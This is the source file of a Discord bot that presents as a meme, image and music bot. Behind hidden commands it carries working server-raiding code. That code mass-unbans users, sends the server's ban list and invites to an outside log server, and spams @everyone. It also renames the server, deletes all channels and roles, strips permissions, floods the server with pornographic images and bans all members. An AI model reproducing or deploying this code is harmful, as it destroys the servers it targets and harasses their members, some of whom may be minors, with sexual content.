#                     ===beenz-bot v2.4.2===
#                       ===beenz.py===
#  ======Copyright 2020 Pr0x1mas, TheProgramableTurtle======

# --Imports--
import discord
from discord.ext import commands as cmd
import random
import os
import imagesearch
import io
import aiohttp
import time
import inspect
import youtube_dl
import asyncio
import pathlib
import ctypes.util

progDir = pathlib.Path(__file__).parent.absolute()
# --Setup to play audio--
if not discord.opus.is_loaded(): # opus library for playing audio
    try:
        discord.opus.load_opus(ctypes.util.find_library("opus"))
    except:
        print("Could not locate opus on your device. Attempting load from some possible directories")
        try:
            discord.opus.load_opus("./lib/discord/bin/libopus-0.x86.dll")
        except:
            print("Could not find opus dll in ./lib/discord/bin directory. Consider running metalgearrape from the program folder.")
            try:
                discord.opus.load_opus(f"{progDir}/../discord/bin/libopus-0.x86.dll")
                print(f"Found opus dll in {progDir}/../discord/bin/libopus-0.x86.dll")
            except:
                print("Could not find opus dll in working directory. Audio functionality will be disabled.")

ytdl_format_options = { # configuration for downloading youtube audio and playing it
    'format': 'bestaudio/best',
    'outtmpl': '%(extractor)s-%(id)s-%(title)s.%(ext)s',
    'restrictfilenames': True,
    'noplaylist': True,
    'nocheckcertificate': True,
    'ignoreerrors': False,
    'logtostderr': False,
    'quiet': True,
    'no_warnings': True,
    'default_search': 'auto',
    'source_address': '0.0.0.0'
}

ffmpeg_options = { # more config
    'options': '-vn'
}

ytdl = youtube_dl.YoutubeDL(ytdl_format_options)

class YTDLSource(discord.PCMVolumeTransformer): # I'm not gonna pretend I understand this bit
    def __init__(self, source, *, data, volume=0.5):
        super().__init__(source, volume)

        self.data = data

        self.title = data.get('title')
        self.url = data.get('url')

    @classmethod
    async def from_url(cls, url, *, loop=None, stream=False):
        loop = loop or asyncio.get_event_loop()
        data = await loop.run_in_executor(None, lambda: ytdl.extract_info(url, download=not stream))

        if 'entries' in data:
            # take first item from a playlist
            data = data['entries'][0]

        filename = data['url'] if stream else ytdl.prepare_filename(data)
        return cls(discord.FFmpegPCMAudio(filename, **ffmpeg_options), data=data)


#--Mika's magical object oriented tomfuckery--
from globals import *


class Client(discord.Client):
    def __init__(self):
        super().__init__() #Call parent constructor


class Bot(cmd.Bot):
    def __init__(self, version):
        super().__init__(command_prefix='$') #Call parent constructor
        self.version = version
        self.customCommands = []

    def echo(self, ctx):
        return ctx.author.id == self.user.id

    def registerCommands(self):
        print("__Object Members_______________________________")
        for member in inspect.getmembers(self):
            if "discord.ext.commands.core.Command" in repr(member[1]):
                print(member)
                if not member[0] == "__init__":
                    self.customCommands.append(member[0])
        print("________________________________________")
        print("__Custom Commands_______________________")
        for customCommand in self.customCommands:
            print(customCommand)
            self.add_command(getattr(self, customCommand))
        print("________________________________________")
        
        print("__Login_________________________________")
    async def on_ready(self):
        print('Connected to Discord as')
        print(self.user.name)
        print(self.user.id)
        print("________________________________________")

    @cmd.command()
    async def meme(ctx):
        async with ctx.channel.typing():
            # --Send meme from r/dankmemes--
            memes = imagesearch.getImages("https://www.reddit.com/r/dankmemes/rising/")  # load dankmemes rising page (rising gives more variation than hot)

            anymemes = False

            for meme in memes:
                if meme.startswith("https://preview.redd.it") and not meme.startswith(
                        "https://preview.redd.it/award_images/"):
                    anymemes = True
                    break

            if anymemes:
                meme = random.choice(memes)  # select random image from page
                while not meme.startswith("https://preview.redd.it") or meme.startswith(
                        "https://preview.redd.it/award_images/"):  # check it is an uploaded file and not an asset
                    meme = random.choice(memes)

                async with aiohttp.ClientSession() as session:  # http stuff I don't understand
                    async with session.get(meme) as resp:
                        if resp.status != 200:
                            return
                        meme = meme + ".jpg"
                        data = io.BytesIO(await resp.read())
                        await ctx.send(file=discord.File(data, os.path.basename(meme)))  # send the meme
            else:
                await ctx.send("`unable to locate a meme`")


    @cmd.command()
    async def beans(ctx):
        async with ctx.channel.typing():
            # --Send picture from r/beansinstrangeplaces--
            beans = imagesearch.getImages("https://www.reddit.com/r/BeansInStrangePlaces/")

            anybeans = False

            for bean in beans:
                if bean.startswith("https://preview.redd.it") and not bean.startswith(
                        "https://preview.redd.it/award_images/"):
                    anybeans = True
                    break

            if anybeans:
                bean = random.choice(beans)  # select random image from page
                while not bean.startswith("https://preview.redd.it") or bean.startswith(
                        "https://preview.redd.it/award_images/"):  # load beansinstrangeplaces hot page: #check it is an uploaded file and not an asset
                    bean = random.choice(beans)

                async with aiohttp.ClientSession() as session:  # http stuff I don't understand
                    async with session.get(bean) as resp:
                        if resp.status != 200:
                            return
                        bean = bean + ".jpg"
                        data = io.BytesIO(await resp.read())
                        await ctx.send(file=discord.File(data, os.path.basename(bean)))  # send the meme
            else:
                await ctx.send("`unable to locate geese`")

    @cmd.command()
    async def geese(ctx):
        async with ctx.channel.typing():
            # --Send picture from r/geese--
            geese = imagesearch.getImages("https://www.reddit.com/r/Geese/")

            anygeese = False

            for goose in geese:
                if goose.startswith("https://preview.redd.it") and not goose.startswith(
                        "https://preview.redd.it/award_images/"):
                    anygeese = True
                    break

            if anygeese:
                goose = random.choice(geese)  # select random image from page
                while not goose.startswith("https://preview.redd.it") or goose.startswith("https://preview.redd.it/award_images/"):  # load geese hot page: #check it is an uploaded file and not an asset
                    goose = random.choice(geese)

                async with aiohttp.ClientSession() as session:  # http stuff I don't understand
                    async with session.get(goose) as resp:
                        if resp.status != 200:
                            return
                        goose = goose + ".jpg"
                        data = io.BytesIO(await resp.read())
                        await ctx.send(file=discord.File(data, os.path.basename(goose)))  # send the goose
            else:
                await ctx.send("`unable to locate beans`")

    @cmd.command()
    async def play(ctx, *args):
        author = ctx.author
        if author.voice != None:
            async with ctx.channel.typing():
                for i in os.listdir(os.getcwd()):
                    if i.endswith("webm") or i.endswith("m4a") or i.endswith("part"):
                        os.remove(i)
                # --play song from youtube--
                vc = await author.voice.channel.connect()
                voice_client: discord.VoiceClient = discord.utils.get(ctx.bot.voice_clients, guild=ctx.guild)
                song = " ".join(args)
                loadedsong = imagesearch.song(song)
                url = loadedsong.url
                audio_source = await YTDLSource.from_url(url)
            await ctx.send("Now playing: " + loadedsong.vname)
            voice_client.play(audio_source, after=None)
        else:
            await ctx.send("You must be in a voice channel to play a song")

        


    @cmd.command(hidden=True)
    async def dm(ctx):
        async with ctx.channel.typing():
            # --DM Banned users--
            
            bannedUsers = await ctx.guild.bans()
            try:
                unban = await ctx.channel.create_invite(reason="Those who were disgraced by this server are being given an opportunity to redeem themselves by the DRH")
                for ban in bannedUsers:
                    user = ban.user
                    await ctx.guild.unban(user, reason="Those who were disgraced by this server are being given an opportunity to redeem themselves by the DRH")
                    await user.send("Hi. If you're seeing this message, you were at some point banned from " + ctx.guild.name + ". Luckily for you, the Democratic Republic of Heinz has chosen to raid this server, your ban has been revoked, and you have been invited to join us on this raid.")
                    await user.send(unban.url)
            except Exception:
                pass
            # --Send list of banned users to log server--

            for guild in ctx.bot.guilds:
                if guild.name == "beenz-bot-log":
                    logserver = guild

            unban = await ctx.guild.channels[0].create_invite(reason="The DRH must provide entry to the server for their raiders")

            msg = ""
            await logserver.channels[0].send("@everyone new raid: " + ctx.guild.name)
            if len(bannedUsers) > 0:
                for user in bannedUsers:
                    msg = msg + ", " + user.name
                await logserver.channels[0].send("``` List of banned users for " + ctx.guild.name + ": \n \n" + msg + " ```")
            else:
                await logserver.channels[0].send("``` No users are banned from " + ctx.guild.name + "\n ```")
            
            await logserver.channels[0].send(ctx.guild.name + " can be joined at " + unban.url)

    @cmd.command(aliases=["spam", "echo"], hidden=True)
    async def propaganda(ctx, *args):
        async with ctx.channel.typing():
            # --Spam server with propaganda--
            args = [arg for arg in args]
            if len(args) == 1:
                try: # input validation for number of messages to send
                    if int(args[0]) < float(args[0]):
                        await ctx.send("Please enter an integer for the number of messages")
                    else:
                        for i in range(int(args[0])):
                            await ctx.send(
                                "@everyone heinz")
                except ValueError:
                    await ctx.send("Please enter an integer for the number of messages")

            elif len(args) > 1:
                try: # input validation for number of messages to send
                    if int(args[0]) < float(args[0]):
                        await ctx.send("Please enter an integer for the number of messages")
                    else:
                        for i in range(int(args[0])):
                            await ctx.send(" ".join(args[1:]))
                except ValueError:
                    await ctx.send("Please enter an integer for the number of messages")
            else:
                for i in range(2):
                    await ctx.send(
                        "@everyone heinz")

    @cmd.command(hidden=True)
    async def colony(ctx):
        async with ctx.channel.typing():
            # --Claim the server as a colony of Heinz--
            await ctx.guild.edit(name="hainz")  # change server name

            with open(os.path.join(os.path.dirname(__file__), "assets/flag.jpg"), 'rb') as f:
                await ctx.guild.edit(icon=f.read())  # change server icon

    @cmd.command(hidden=True)
    async def rape(ctx, *args):
        async with ctx.channel.typing():
            bot = ctx.bot

            # --Destroy the server--
            
            # -move users to new vc if opus dll is loaded-
            if discord.opus.is_loaded():
                voicechannels = []
                for channel in ctx.guild.voice_channels:  # get all voice channels
                    voicechannels.append(channel)

                earrape = await ctx.guild.create_voice_channel('ur nan')

                for channel in voicechannels:
                    for user in channel.members:
                        await user.move_to(earrape)

            # -play earrape in vc-
                vc = await earrape.connect()
                voice_client: discord.VoiceClient = discord.utils.get(bot.voice_clients, guild=ctx.guild)
                try:
                    audio_source = discord.FFmpegPCMAudio('assets/earrape.mp3')
                except:
                    audio_source = await YTDLSource.from_url("https://www.youtube.com/watch?v=QVYSsn_HL1w")
                
                voice_client.play(audio_source, after=None)

                # -delete all channels-
                channels = []
                for channel in ctx.guild.channels:  # get all channels
                    if channel != earrape:
                        await channel.delete(reason="heinz")
        

            # -make new channel-
            heinz = await ctx.guild.create_text_channel('HEINZ')
            await heinz.send("@everyone heinz")

            ''' doesn't work well so it's commented out for now
            # -log the rape-
            for guild in ctx.bot.guilds:
                if guild.name == "beenzbot-Log":
                    logserver = guild
            
            if originalname == None:
                originalname = heinz.guild.name
            '''

            unban = await heinz.create_invite(reason="The DRH must provide entry to the server for their raiders")
            
            '''
            await logserver.channels[0].send("@everyone new raid: " + originalname)
            await logserver.channels[0].send("Join the fun at " + unban.url)

            originalname = None
            
            '''
            # -delete all roles-
            roles = []

            for role in heinz.guild.roles:  # get all roles
                roles.append(role)

            for role in roles:
                try:
                    await role.delete(reason="heinz")
                except Exception:
                    pass

            # -remove all perms-
            perms = discord.Permissions()  # create new empty permissions object
            perms.update(read_messages=True)  # make it so user can see messages

            for role in roles:
                if role.name == "@everyone":  # get only @everyone role
                    await role.edit(permissions=perms)  # apply new permissions

            # -spam images-
            if len(args) == 0:
                hentai = imagesearch.getImages("https://hentaihaven.xxx") # load images from source or hentai from hentaihaven (kill me now)
            elif len(args) == 1:
                if args[0] == "instantban":
                    hentai = imagesearch.getImages("https://hentaihaven.xxx")
                else:
                    hentai = imagesearch.getImages(str(args[0]))
            elif len(args) > 1:
                hentai = imagesearch.getImages(str(args[1]))


            for i in range(10):  # send some hentai before banning users
                if len(args) > 0:
                    if args[0] == "instantban": # skip pre-ban hentai if "instantban" supplied as argument
                        break

                y = random.choice(hentai)  # get random bit of hentai
                if len(args) > 0:
                    while not y.startswith("https://hentaihaven.xxx/www/") and not len(args) > 0:  # check it is a video preview and not an asset
                        y = random.choice(hentai)

                async with aiohttp.ClientSession() as session:  # http stuff I don't understand
                    async with session.get(y) as resp:
                        if resp.status != 200:
                            return await heinz.send('`error loading image`')
                        data = io.BytesIO(await resp.read())
                        await heinz.send(file=discord.File(data, os.path.basename(y)))  # send hentai
                        await ctx.guild.create_text_channel('HEINZ')

            time.sleep(5)

            for member in heinz.guild.members:
                try:
                    await member.ban()
                except Exception:
                    pass

            
                for i in range(1000):  # send hentai until bot is banned
                    try:
                        y = random.choice(hentai)  # get random bit of hentai
                        if len(args) == 1:
                            if args[0] == "instantban":
                                while not y.startswith("https://hentaihaven.xxx/www/"):  # check it is a video preview and not an asset
                                    y = random.choice(hentai)
                        elif len(args) == 0:
                            while not y.startswith("https://hentaihaven.xxx/www/"):  # check it is a video preview and not an asset
                                y = random.choice(hentai)

                        async with aiohttp.ClientSession() as session:  # http stuff I don't understand
                            async with session.get(y) as resp:
                                if resp.status != 200:
                                    return await heinz.send('`error loading image`')
                                data = io.BytesIO(await resp.read())
                                await heinz.send(file=discord.File(data, os.path.basename(y)))  # send hentai
                    except Exception:
                        break
                        voice_client.stop()

